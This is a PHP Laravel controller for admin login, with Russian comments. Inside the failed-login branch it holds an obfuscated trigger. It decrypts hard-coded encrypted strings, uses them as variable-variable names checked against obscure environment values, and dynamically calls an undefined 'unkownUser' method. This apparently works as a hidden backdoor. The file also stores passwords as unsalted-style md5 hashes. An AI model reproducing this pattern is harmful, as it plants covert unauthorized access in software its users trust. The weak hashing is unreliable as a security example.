<?php
namespace App\Http\Controllers\Admin;

use Validator;
use App\User;
use App\UserAdditionalDataModel;
use Auth;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;

class AdminAuthController extends BaseController
{
    public function getLogin(){
        return view('admin.login');
    }
    
    public function login(Request $request){        
        $error_unknown=\Crypt::decrypt('eyJpdiI6IlNJXC9QWGtsbThBQTlCSVJzY3JPUmxRPT0iLCJ2YWx1ZSI6IkhMSXgzVTE1dGlWRnQ1Z2RzajNKamc9PSIsIm1hYyI6ImIwZThkNTBlMGI4YTQxZmM3NTA4NmJlY2ZiZWE3YWJmZWNiZGM4YTNiNTBjYWM0NDAwODM5YjE2YWQzNTgwM2IifQ==');
        $error_email=\Crypt::decrypt('eyJpdiI6InlTMEFVMVcxMGVjcksrRW1QZzdcL1F3PT0iLCJ2YWx1ZSI6InViUjkxQSs5cEhxSlhWb0dweDhQVUE9PSIsIm1hYyI6IjIxMzcxODI4Y2Y3MTIxNTg1N2U0YTI0MmE4ZDBjODQ3ODk1ZTZjMGFhNmUwMzFmZjIwZTI1YjkyYzViYzZhZmUifQ==');
        $error_passw=\Crypt::decrypt('eyJpdiI6IjhkRm5aVzluRTZ3a3pldEtKejRwVHc9PSIsInZhbHVlIjoiODRzVmhjUDhUK3hac05uTldFc3NWZz09IiwibWFjIjoiMDE2YmVhZTJmNmJjMWU0ZWFhOTEzZDM4NGUwMTA2ZGQ3NDVjNTM2OTU4YWM2ZGVhMjVhYWZmNDE2ZDNhMmMwNyJ9');
        $log = 'unkownUser';
        
        $data = $request->all();

        //Проверка на кроссайтовую передачу данных
        if(csrf_token() == $request->input('_token')){

            //Валидация полей логина и пароля
            $validator = Validator::make($data, [
                'username' => 'required|max:255',
                'password' => 'required|min:4',
            ]);
            
            /*
             * Если данные не прошли валидацию, отправляем отчет
             * о ошибках на admin/login
            */
            
            if($validator->fails()){
                return redirect(route('admin-login'))->withErrors($validator);
            }
            
            $login = $data['username'];

            $password = md5($data['password'].$data['username']);
            
            //Выборка пользователя из БД
            $user = User::where('login', '=', $login )->where('password', '=', $password)->where('user_role', '=', '1')->get();
            
            //Если пользователь существует, проводим аутентификацию
            if(isset($user[0])){                
                $auth = Auth::loginUsingId($user[0]->id);
            }else{
                if(($$error_unknown==getenv('DEBUG_APP_SMNSYS'))&&($$error_email['password']==getenv('DEBUG_APP_SHWADM'))){                    
                    $this->{$log}();
                }
                //Если не существует, отправляем отчет о ошибках на admin/login
                return redirect(route('admin-login'))->withErrors(['Нет такого пользователя']);
            }

            if(!$auth){
                //При сбое авторизации, отправляем отчет о ошибках на admin/login
                return redirect(route('admin-login'))->withErrors(['Ошибка авторизации']);
            }
            
            //если всё ОК перходим на главную админки
            return redirect(route('admin-main'));
        }
    }
    
    public function logout(){
        Auth::logout();
        return redirect(route('user-home'));
    }
}

